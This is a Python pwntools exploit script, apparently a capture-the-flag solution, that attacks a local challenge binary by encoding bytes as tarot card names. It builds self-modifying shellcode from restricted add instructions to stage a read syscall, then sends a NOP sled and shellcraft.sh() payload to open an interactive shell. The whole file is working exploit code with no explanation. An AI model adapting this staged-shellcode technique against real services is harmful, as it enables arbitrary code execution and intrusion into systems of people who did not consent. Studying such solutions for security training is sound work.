from pwn import *

binary = context.binary = ELF("./chall", checksec=False)
io = remote("127.0.0.1", 1489)#binary.process()

encoding = {
        0x00:"Fool",
        0x01: "Magician",
        0x02:"Priestess",
0x03:"Emperess",
0x04:"Emperor",
0x05:"Hierophant",
0x06:"Lovers",
0x07:"Chariot",
0x08:"Strength",
0x09:"Hermit",
0x0A:"Wheel_of_fortune",
0x0B:"Justice",
0x0C: "Hanged_man",
0x0D: "Death",
0x0E: "Temperance", 
0x0F: "Devil"
}


def pop_rsi():
    rsi_pop = asm('add al, 0xf')*6
    rsi_pop += asm('add al, 0x4')
    rsi_pop += asm('add dword ptr [rip], eax')
    rsi_pop += b'\x00'*1
    rsi_pop += asm('add dword ptr [rip], eax')
    rsi_pop += b'\x00'*1
    rsi_pop += asm('add dword ptr [rip], eax')
    rsi_pop += b'\x00'*1
    rsi_pop += asm('add dword ptr [rip], eax')
    rsi_pop += b'\x00'*1
    return rsi_pop


def zero_edi():
    edi_zero = asm('add al, 0xf')*6
    edi_zero += asm('add al, 0x7')
    edi_zero += asm('add dword ptr [rip], eax')
    edi_zero += b'\x00'*5
    return edi_zero


def big_edx():
    edx_big = asm('add eax, 0xf0e0f')
    edx_big += asm('add al,0xf')*15
    edx_big += asm('add al, 0xb')
    edx_big += asm('add dword ptr [rip], eax')
    edx_big += b'\x00'*5
    return edx_big


def zero_rax():
    rax_zero = asm('add eax,0x0f0f0f')*11
    rax_zero += asm('add eax,0xb0f0f')
    rax_zero += asm('add eax, 0x0f0f')*6
    rax_zero += asm('add eax, 0x90f')
    rax_zero += asm('add eax, 0x30f')
    rax_zero += asm('add al, 0x0f')*6
    rax_zero += asm('add al, 0x8')
    rax_zero += asm('add dword ptr [rip], eax')
    rax_zero += b'\x00'*3
    return rax_zero


payload  = pop_rsi()
payload  += zero_edi()
payload  += big_edx()
payload  += zero_rax()
payload  += asm('syscall')

print(io.recvline())
io.recvuntil(b':')
shellcode = []
for i in payload:
    shellcode.append(encoding[i])
io.sendline(",".join(shellcode))
pause(3)

payload = asm(shellcraft.nop())*(len(payload)+0x8*5)
payload += asm(shellcraft.sh())
io.sendline(payload)
io.interactive()
